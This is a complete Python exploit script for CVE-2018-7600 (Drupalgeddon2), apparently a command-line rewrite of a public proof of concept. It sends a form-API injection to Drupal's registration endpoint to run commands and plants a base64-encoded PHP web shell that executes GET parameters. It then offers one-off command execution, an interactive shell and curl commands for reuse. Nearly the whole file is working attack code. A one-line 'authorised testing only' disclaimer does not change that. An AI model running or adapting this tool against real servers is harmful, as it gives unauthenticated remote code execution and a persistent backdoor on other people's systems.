#!/usr/bin/env python3
"""
drupalgeddon2.py - CVE-2018-7600 (Drupalgeddon2) exploit.

A rewrite of a2u/CVE-2018-7600 that takes the target URL and a command as
arguments instead of requiring manual edits to the payload each time.

What it does:
  1. Uses the CVE-2018-7600 form-API injection to drop a tiny PHP web shell
     onto the target (the vulnerable server writes the file itself).
  2. Lets you run commands through that shell via --cmd, or drop into an
     interactive pseudo-shell with --shell.

Affects: Drupal < 7.58 and < 8.5.1 (unauthenticated RCE).

Usage:
    # one-off command
    python3 drupalgeddon2.py -u http://target/ -c id

    # interactive shell
    python3 drupalgeddon2.py -u http://target/ --shell

    # just plant the shell, don't run anything
    python3 drupalgeddon2.py -u http://target/ --deploy-only

    # route through Burp
    python3 drupalgeddon2.py -u http://target/ -c id --proxy http://127.0.0.1:8080 -k

Credit: original PoC by Vitalii Rudnykh (https://github.com/a2u/CVE-2018-7600).
This version adds a CLI, auto-deploy of the web shell, and an interactive mode.
"""

import argparse
import sys
import base64
import hashlib
import secrets

import requests

try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception:
    pass


class C:
    G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[94m"
    BOLD = "\033[1m"; END = "\033[0m"


BANNER = f"""{C.B}
################################################################
#  Drupalgeddon2  -  CVE-2018-7600                             #
#  Unauthenticated RCE for Drupal < 7.58 / < 8.5.1             #
#  Rewrite of a2u/CVE-2018-7600 (orig: Vitalii Rudnykh)        #
################################################################{C.END}
"""


class Drupalgeddon2:
    def __init__(self, target, shell_name=None, param=None,
                 proxy=None, verify=True, timeout=15):
        self.target = target if target.endswith("/") else target + "/"
        self.timeout = timeout
        self.verify = verify
        self.proxies = {"http": proxy, "https": proxy} if proxy else {}
        self.session = requests.Session()

        # Randomise the shell filename and the GET parameter so we don't leave
        # a predictable cmd= door open for a drive-by attacker, and so repeat
        # runs don't collide. (The HTB module hard-codes an md5 for the same
        # reason; we generate a fresh one each run.)
        self.shell_name = shell_name or (secrets.token_hex(8) + ".php")
        self.param = param or hashlib.md5(secrets.token_bytes(16)).hexdigest()
        self.shell_url = self.target + self.shell_name

    def _injection_endpoint(self):
        # Drupal 8 path. The form-API injection abuses the AJAX render of the
        # account/mail element on the user-registration form.
        return (self.target +
                "user/register?element_parents=account/mail/%23value"
                "&ajax_form=1&_wrapper_format=drupal_ajax")

    def _run_server_command(self, command):
        """
        Fire one CVE-2018-7600 injection that runs `command` on the server
        via exec, and return the raw response text.
        """
        payload = {
            "form_id": "user_register_form",
            "_drupal_ajax": "1",
            "mail[#post_render][]": "exec",
            "mail[#type]": "markup",
            "mail[#markup]": command,
        }
        try:
            r = self.session.post(self._injection_endpoint(), data=payload,
                                proxies=self.proxies, verify=self.verify,
                                timeout=self.timeout)
            return r.text
        except requests.RequestException as e:
            print(f"{C.R}[!] Request failed: {e}{C.END}")
            return None

    def deploy_shell(self):
        """
        Plant the PHP web shell on the target. We base64-encode it locally and
        have the server decode it to disk, which sidesteps quoting/escaping
        problems with the injected command.
        """
        php = f"<?php if(isset($_GET['{self.param}'])){{system($_GET['{self.param}']);}} ?>"
        b64 = base64.b64encode(php.encode()).decode()

        # server-side: decode our base64 back into the .php file
        drop_cmd = f"echo {b64} | base64 -d | tee {self.shell_name}"

        print(f"{C.Y}[*] Target      : {self.target}{C.END}")
        print(f"{C.Y}[*] Deploying shell as: {self.shell_name}{C.END}")
        print(f"{C.Y}[*] Cmd parameter : {self.param}{C.END}")

        self._run_server_command(drop_cmd)

        # verify it landed
        if self._verify_shell():
            print(f"{C.G}{C.BOLD}[+] Shell deployed: {self.shell_url}{C.END}")
            return True
        print(f"{C.R}[!] Could not confirm the shell. Target may be patched, "
              f"the webroot may not be writable, or this is the wrong Drupal "
              f"major version.{C.END}")
        return False

    def _verify_shell(self):
        """Confirm the shell file exists and executes (echo a known token)."""
        token = secrets.token_hex(6)
        try:
            r = self.session.get(self.shell_url, params={self.param: f"echo {token}"},
                                proxies=self.proxies, verify=self.verify,
                                timeout=self.timeout)
            return token in r.text
        except requests.RequestException:
            return False

    def run_command(self, command):
        """Run a command through the already-deployed shell, return its output."""
        try:
            r = self.session.get(self.shell_url, params={self.param: command},
                                proxies=self.proxies, verify=self.verify,
                                timeout=self.timeout)
            return r.text
        except requests.RequestException as e:
            return f"[!] Request failed: {e}"

    def interactive(self):
        print(f"{C.B}[*] Interactive shell. Type 'exit' to quit.{C.END}")
        # show where/who we are up front
        whoami = self.run_command("whoami").strip()
        host = self.run_command("hostname").strip()
        while True:
            try:
                cmd = input(f"{C.G}{whoami}@{host}{C.END}$ ")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if cmd.strip() in ("exit", "quit"):
                break
            if not cmd.strip():
                continue
            print(self.run_command(cmd), end="")


def main():
    print(BANNER)
    print(f"{C.Y}Provided for educational and authorised testing only.{C.END}\n")

    ap = argparse.ArgumentParser(
        description="Drupalgeddon2 (CVE-2018-7600) RCE exploit with CLI.")
    ap.add_argument("-u", "--url", required=True,
                    help="Target base URL, e.g. http://target/")
    ap.add_argument("-c", "--cmd", help="Single command to run on the target")
    ap.add_argument("--shell", action="store_true",
                    help="Drop into an interactive pseudo-shell")
    ap.add_argument("--deploy-only", action="store_true",
                    help="Only plant the web shell, run nothing")
    ap.add_argument("--shell-name",
                    help="Filename for the planted shell (default: random .php)")
    ap.add_argument("--param",
                    help="GET parameter name for the shell (default: random md5)")
    ap.add_argument("--proxy", help="Proxy URL, e.g. http://127.0.0.1:8080")
    ap.add_argument("-k", "--insecure", action="store_true",
                    help="Disable TLS verification (for self-signed proxy certs)")
    ap.add_argument("--timeout", type=int, default=15,
                    help="Per-request timeout (default: 15s)")
    args = ap.parse_args()

    exp = Drupalgeddon2(
        target=args.url,
        shell_name=args.shell_name,
        param=args.param,
        proxy=args.proxy,
        verify=not args.insecure,
        timeout=args.timeout,
    )

    if not exp.deploy_shell():
        sys.exit(2)

    if args.deploy_only:
        print(f"{C.Y}[*] Shell ready. Run commands with:{C.END}")
        print(f"    curl \"{exp.shell_url}?{exp.param}=id\"")
        return

    if args.shell:
        exp.interactive()
    elif args.cmd:
        out = exp.run_command(args.cmd)
        print(f"{C.G}[+] Output:{C.END}\n{out}", end="")
    else:
        # no action specified: show how to use the planted shell
        print(f"{C.Y}[*] Shell deployed. Use -c CMD or --shell, or curl:{C.END}")
        print(f"    curl \"{exp.shell_url}?{exp.param}=id\"")


if __name__ == "__main__":
    main()
